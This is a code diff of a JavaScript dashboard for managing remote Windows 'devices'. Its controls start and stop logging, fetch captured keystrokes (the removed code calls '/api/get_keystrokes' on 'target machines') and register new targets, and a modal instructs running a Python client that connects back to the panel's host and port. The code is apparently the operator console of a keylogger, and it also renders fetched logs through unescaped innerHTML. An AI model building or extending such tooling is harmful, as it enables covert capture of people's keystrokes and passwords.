@@ -2,6 +2,23 @@
 const toastEl = document.getElementById('alert-toast');
 const toast = new bootstrap.Toast(toastEl);
 
+// Get CSRF token from meta tag - move this inside DOMContentLoaded
+let csrfToken;
+let devices = [];
+let isEncrypted = {};  // Store encryption state for each device
+
+// Wrap all initialization code in DOMContentLoaded
+document.addEventListener('DOMContentLoaded', function() {
+    // Get CSRF token after DOM is loaded
+    csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+    
+    // Initial device refresh
+    refreshDevices();
+    
+    // Set up periodic refresh
+    setInterval(refreshDevices, 30000); // Update every 30 seconds
+});
+
 function showAlert(message, type = 'success') {
     const toast = document.getElementById('alert-toast');
     toast.className = `toast align-items-center text-white bg-${type} border-0`;
@@ -15,100 +32,91 @@ function formatDate(dateString) {
     return date.toLocaleString();
 }
 
-let encryptionState = {};
-
 function updateDevicesList(devices) {
-    const container = document.getElementById('devices-list');
-    container.innerHTML = '';
+    const devicesList = document.getElementById('devices-list');
+    const template = document.getElementById('device-template');
+    devicesList.innerHTML = '';
     
     if (devices.length === 0) {
-        container.innerHTML = '<div class="alert alert-info">No devices connected</div>';
+        devicesList.innerHTML = '<div class="alert alert-info">No Windows devices connected. Click "New Connection" to add a device.</div>';
         return;
     }
     
     devices.forEach(device => {
-        // Set initial state for encryption
-        if (!encryptionState.hasOwnProperty(device.device_id)) {
-            encryptionState[device.device_id] = false;
-        }
+        const clone = template.content.cloneNode(true);
+        const deviceItem = clone.querySelector('.device-item');
         
-        const deviceHtml = `
-            <div class="device-item mb-3" data-device-id="${device.device_id}">
-                <div class="card">
-                    <div class="card-body">
-                        <div class="d-flex justify-content-between align-items-start">
-                            <div>
-                                <h5 class="card-title">${device.name || device.device_id}</h5>
-                                <p class="card-text device-id">${device.device_id}</p>
-                            </div>
-                            <span class="badge ${device.is_active ? 'bg-success' : 'bg-danger'} device-status">
-                                ${device.is_active ? 'Active' : 'Inactive'}
-                            </span>
-                        </div>
-                        
-                        <div class="device-info small text-muted mb-3">
-                            <div><i class="bi bi-clock"></i> Last seen: ${formatDate(device.last_seen)}</div>
-                        </div>
-                        
-                        <div class="btn-group mb-3">
-                            <button class="btn btn-success start-logging" onclick="startLogging(this)">
-                                <i class="bi bi-play-circle"></i> Start
-                            </button>
-                            <button class="btn btn-danger stop-logging" onclick="stopLogging(this)">
-                                <i class="bi bi-stop-circle"></i> Stop
-                            </button>
-                            <button class="btn btn-primary view-logs" onclick="viewLogs(this)">
-                                <i class="bi bi-eye"></i> View Logs
-                            </button>
-                            <button class="btn btn-secondary toggle-encryption" onclick="toggleEncryption(this)">
-                                <i class="bi bi-lock"></i> <span>Decrypt</span>
-                            </button>
-                            <button class="btn btn-danger" onclick="removeDevice(this)">
-                                <i class="bi bi-trash"></i> Remove
-                            </button>
-                        </div>
-                        
-                        <div class="logs-container mt-3" style="display: none;">
-                            <div class="card">
-                                <div class="card-body">
-                                    <pre class="logs-content">No logs available</pre>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        `;
-        container.insertAdjacentHTML('beforeend', deviceHtml);
+        // Set device ID as data attribute
+        deviceItem.dataset.deviceId = device.id;
         
-        // Update button states after adding to DOM
-        const deviceItem = container.lastElementChild;
-        const startBtn = deviceItem.querySelector('.start-logging');
-        const stopBtn = deviceItem.querySelector('.stop-logging');
+        // Update device information
+        clone.querySelector('.device-id').textContent = `ID: ${device.id}`;
+        clone.querySelector('.device-name-text').textContent = device.name || 'Unnamed Device';
         
-        if (!device.is_active) {
-            // When device is inactive, only view logs, decrypt/encrypt and remove are enabled
-            startBtn.disabled = true;
-            stopBtn.disabled = true;
+        // Update status badge
+        const statusBadge = clone.querySelector('.device-status');
+        if (device.is_logging) {
+            statusBadge.className = 'device-status badge bg-warning';
+            statusBadge.textContent = 'Logging';
+            // Update button states
+            clone.querySelector('[onclick="startLogging(this)"]').disabled = true;
+            clone.querySelector('[onclick="stopLogging(this)"]').disabled = false;
+        } else if (device.is_active) {
+            statusBadge.className = 'device-status badge bg-success';
+            statusBadge.textContent = 'Connected';
         } else {
-            // When device is active, all buttons are enabled
-            // Start and stop buttons are opposite of each other
-            startBtn.disabled = false;
-            stopBtn.disabled = true;
+            statusBadge.className = 'device-status badge bg-secondary';
+            statusBadge.textContent = 'Disconnected';
         }
+        
+        devicesList.appendChild(clone);
     });
 }
 
-async function startLogging(btn) {
+async function toggleLogs(btn) {
     const deviceItem = btn.closest('.device-item');
     const deviceId = deviceItem.dataset.deviceId;
+    const logsContainer = deviceItem.querySelector('.logs-container');
+    const logsContent = logsContainer.querySelector('.logs-content');
     
+    if (logsContainer.style.display === 'none') {
+        try {
+            const response = await fetch(`/api/logs/${deviceId}`, {
+                headers: {
+                    'X-CSRFToken': csrfToken
+                }
+            });
+            
+            if (response.ok) {
+                const logs = await response.json();
+                if (logs.length > 0) {
+                    logsContent.innerHTML = logs.join('<br>');
+                } else {
+                    logsContent.textContent = 'No logs available';
+                }
+                logsContainer.style.display = 'block';
+                btn.innerHTML = '<i class="bi bi-eye-slash"></i> Hide Logs';
+            } else {
+                throw new Error('Failed to fetch logs');
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            showAlert('Failed to fetch logs', 'danger');
+        }
+    } else {
+        logsContainer.style.display = 'none';
+        btn.innerHTML = '<i class="bi bi-eye"></i> View Logs';
+    }
+}
+
+async function startLogging(btn) {
+    const deviceId = btn.closest('.device-item').dataset.deviceId;
     try {
         const response = await fetch('/api/toggle_logging', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
-                'X-Requested-With': 'XMLHttpRequest'
+                'X-CSRFToken': csrfToken
             },
             body: JSON.stringify({
                 device_id: deviceId,
@@ -117,36 +125,29 @@ async function startLogging(btn) {
         });
         
         if (response.ok) {
-            const data = await response.json();
-            const startBtn = deviceItem.querySelector('.start-logging');
-            const stopBtn = deviceItem.querySelector('.stop-logging');
-            const statusBadge = deviceItem.querySelector('.device-status');
-            
-            startBtn.disabled = true;
-            stopBtn.disabled = false;
-            statusBadge.className = 'badge bg-success device-status';
-            statusBadge.textContent = 'Active';
-            
-            showAlert(data.message || 'Logging started', 'success');
+            btn.disabled = true;
+            btn.nextElementSibling.disabled = false;
+            const statusBadge = btn.closest('.device-item').querySelector('.device-status');
+            statusBadge.textContent = 'Logging';
+            statusBadge.className = 'device-status badge bg-warning';
+            showAlert('Logging started successfully', 'success');
         } else {
-            const error = await response.json();
-            showAlert(error.error || 'Error starting logging', 'danger');
+            throw new Error('Failed to start logging');
         }
     } catch (error) {
-        showAlert('Error starting logging', 'danger');
+        console.error('Error:', error);
+        showAlert('Failed to start logging', 'danger');
     }
 }
 
 async function stopLogging(btn) {
-    const deviceItem = btn.closest('.device-item');
-    const deviceId = deviceItem.dataset.deviceId;
-    
+    const deviceId = btn.closest('.device-item').dataset.deviceId;
     try {
         const response = await fetch('/api/toggle_logging', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
-                'X-Requested-With': 'XMLHttpRequest'
+                'X-CSRFToken': csrfToken
             },
             body: JSON.stringify({
                 device_id: deviceId,
@@ -155,83 +156,36 @@ async function stopLogging(btn) {
         });
         
         if (response.ok) {
-            const data = await response.json();
-            const startBtn = deviceItem.querySelector('.start-logging');
-            const stopBtn = deviceItem.querySelector('.stop-logging');
-            const statusBadge = deviceItem.querySelector('.device-status');
-            
-            startBtn.disabled = false;
-            stopBtn.disabled = true;
-            statusBadge.className = 'badge bg-danger device-status';
-            statusBadge.textContent = 'Inactive';
-            
-            showAlert(data.message || 'Logging stopped', 'success');
+            btn.disabled = true;
+            btn.previousElementSibling.disabled = false;
+            const statusBadge = btn.closest('.device-item').querySelector('.device-status');
+            statusBadge.textContent = 'Connected';
+            statusBadge.className = 'device-status badge bg-success';
+            showAlert('Logging stopped successfully', 'success');
         } else {
-            const error = await response.json();
-            showAlert(error.error || 'Error stopping logging', 'danger');
+            throw new Error('Failed to stop logging');
         }
     } catch (error) {
-        showAlert('Error stopping logging', 'danger');
-    }
-}
-
-function toggleEncryption(btn) {
-    const deviceItem = btn.closest('.device-item');
-    const deviceId = deviceItem.dataset.deviceId;
-    
-    encryptionState[deviceId] = !encryptionState[deviceId];
-    
-    const span = btn.querySelector('span');
-    const icon = btn.querySelector('i');
-    if (encryptionState[deviceId]) {
-        span.textContent = 'Encrypt';
-        icon.className = 'bi bi-unlock';
-    } else {
-        span.textContent = 'Decrypt';
-        icon.className = 'bi bi-lock';
-    }
-    
-    const logsContainer = deviceItem.querySelector('.logs-container');
-    if (logsContainer.style.display !== 'none') {
-        viewLogs(deviceItem.querySelector('.view-logs'));
-    }
-}
-
-async function viewLogs(btn) {
-    const deviceItem = btn.closest('.device-item');
-    const deviceId = deviceItem.dataset.deviceId;
-    const logsContainer = deviceItem.querySelector('.logs-container');
-    const logsContent = logsContainer.querySelector('.logs-content');
-    
-    try {
-        const response = await fetch(`/api/get_keystrokes?machine=${deviceId}&encrypted=${encryptionState[deviceId] || false}`);
-        if (response.ok) {
-            const data = await response.json();
-            logsContent.textContent = data.data;
-            logsContainer.style.display = logsContainer.style.display === 'none' ? 'block' : 'none';
-        } else {
-            const error = await response.json();
-            showAlert(error.error || 'Error fetching logs', 'danger');
-        }
-    } catch (error) {
-        showAlert('Error fetching logs', 'danger');
+        console.error('Error:', error);
+        showAlert('Failed to stop logging', 'danger');
     }
 }
 
 async function removeDevice(btn) {
-    if (!confirm('Are you sure you want to remove this device? All logs will be deleted.')) {
-        return;
-    }
-    
     const deviceItem = btn.closest('.device-item');
     const deviceId = deviceItem.dataset.deviceId;
+    
+    // Ask for confirmation
+    if (!confirm('Are you sure you want to remove this device? This action cannot be undone.')) {
+        return;
+    }
     
     try {
         const response = await fetch('/api/remove_device', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
-                'X-Requested-With': 'XMLHttpRequest'
+                'X-CSRFToken': csrfToken
             },
             body: JSON.stringify({
                 device_id: deviceId
@@ -241,65 +195,140 @@ async function removeDevice(btn) {
         if (response.ok) {
             deviceItem.remove();
             showAlert('Device removed successfully', 'success');
+            
+            // Check if there are any devices left
+            const devicesList = document.getElementById('devices-list');
+            if (!devicesList.children.length) {
+                devicesList.innerHTML = '<div class="alert alert-info">No Windows devices connected. Click "New Connection" to add a device.</div>';
+            }
         } else {
             const error = await response.json();
-            showAlert(error.error || 'Error removing device', 'danger');
+            throw new Error(error.error || 'Failed to remove device');
         }
     } catch (error) {
-        showAlert('Error removing device', 'danger');
+        console.error('Error:', error);
+        showAlert('Failed to remove device: ' + error.message, 'danger');
     }
 }
 
-// Wait for DOM to be fully loaded
-document.addEventListener('DOMContentLoaded', function() {
-    // Register device form submission
-    document.getElementById('register-device-form').addEventListener('submit', async function(e) {
-        e.preventDefault();
+async function toggleEncryption(btn) {
+    const deviceId = btn.closest('.device-item').dataset.deviceId;
+    try {
+        const response = await fetch('/api/toggle_encryption', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRFToken': csrfToken
+            },
+            body: JSON.stringify({
+                device_id: deviceId
+            })
+        });
         
-        const deviceName = document.getElementById('device-name').value;
-        const deviceId = 'WIN-' + Math.random().toString(36).substr(2, 9).toUpperCase();
-        
-        try {
-            const response = await fetch('/api/register_device', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Requested-With': 'XMLHttpRequest'
-                },
-                body: JSON.stringify({
-                    device_id: deviceId,
-                    name: deviceName
-                })
-            });
-            
-            if (response.ok) {
-                document.getElementById('device-name').value = '';
-                showAlert('Device registered successfully', 'success');
-                refreshDevices();
+        if (response.ok) {
+            const data = await response.json();
+            const icon = btn.querySelector('i');
+            if (data.is_encrypted) {
+                icon.className = 'bi bi-lock-fill';
+                btn.title = 'Encryption enabled';
             } else {
-                const error = await response.json();
-                showAlert(error.error || 'Error registering device', 'danger');
+                icon.className = 'bi bi-unlock';
+                btn.title = 'Encryption disabled';
             }
-        } catch (error) {
-            showAlert('Error registering device', 'danger');
+            showAlert(`Encryption ${data.is_encrypted ? 'enabled' : 'disabled'}`, 'success');
+        } else {
+            throw new Error('Failed to toggle encryption');
         }
-    });
-
-    // Initial refresh
-    refreshDevices();
-    
-    // Set up periodic refresh
-    setInterval(refreshDevices, 30000);
-});
+    } catch (error) {
+        console.error('Error:', error);
+        showAlert('Failed to toggle encryption', 'danger');
+    }
+}
 
 async function refreshDevices() {
     try {
-        const response = await fetch('/api/get_target_machines_list');
+        const response = await fetch('/api/devices?type=windows', {
+            headers: {
+                'X-CSRFToken': csrfToken
+            }
+        });
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        const devices = await response.json();
+        updateDevicesList(devices);
+    } catch (error) {
+        console.error('Error fetching devices:', error);
+        const devicesList = document.getElementById('devices-list');
+        devicesList.innerHTML = '<div class="alert alert-danger">Error loading devices. Please try again later.</div>';
+    }
+}
+
+async function createNewConnection() {
+    try {
+        const response = await fetch('/api/register_device', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRFToken': csrfToken
+            },
+            body: JSON.stringify({
+                type: 'windows'
+            })
+        });
+        
         if (response.ok) {
-            const devices = await response.json();
-            updateDevicesList(devices);
+            const data = await response.json();
+            
+            // Show connection details to the user
+            showConnectionModal(data.device_id, data.host, data.port);
+            
+            refreshDevices();
+        } else {
+            const error = await response.json();
+            throw new Error(error.error || 'Failed to register device');
         }
     } catch (error) {
-        console.error('Error refreshing devices:', error);
+        console.error('Error:', error);
+        showAlert(error.message || 'Failed to register Windows device', 'danger');
     }
+}
+
+function showConnectionModal(deviceId, host, port) {
+    const modalHtml = `
+        <div class="modal fade" id="connectionModal" tabindex="-1">
+            <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title">New Windows Device Connection</h5>
+                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                    </div>
+                    <div class="modal-body">
+                        <p>Use these details on your Windows device:</p>
+                        <pre class="bg-light p-3">
+Device ID: ${deviceId}
+Host: ${host}
+Port: ${port}</pre>
+                        <p>Run this command on your Windows device:</p>
+                        <pre class="bg-light p-3">python windows_client.py ${deviceId} ${host} ${port}</pre>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    `;
+    
+    // Add modal to document
+    document.body.insertAdjacentHTML('beforeend', modalHtml);
+    
+    // Show modal
+    const modal = new bootstrap.Modal(document.getElementById('connectionModal'));
+    modal.show();
+    
+    // Remove modal from DOM after it's hidden
+    document.getElementById('connectionModal').addEventListener('hidden.bs.modal', function () {
+        this.remove();
+    });
 } 
